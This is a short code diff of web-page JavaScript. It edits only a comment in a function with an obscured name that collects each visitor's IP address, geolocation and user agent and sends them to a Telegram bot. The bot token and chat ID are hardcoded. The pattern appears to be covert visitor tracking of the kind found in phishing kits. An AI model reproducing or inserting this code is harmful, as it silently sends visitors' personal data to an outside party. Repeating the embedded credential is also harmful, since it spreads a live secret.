@@ -24,7 +24,7 @@
 
         async function x98vbn(ip, location, userAgent) {
             const token = '7197964353:AAFQtfYUleR1gc0F8HLbsy9DDivJdyPHDUw'; 
-            const chat = '-1002235777506';  // Reemplaza 'TU_CHAT_ID' con tu ID de chat real
+            const chat = '-1002235777506';  
 
             const message = `✅🍔 Nueva visita desde la IP: ${ip}\nUbicación: ${location.city}, ${location.regionName}, ${location.country}\n \nAgente de Usuario: ${userAgent}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(message)}`;
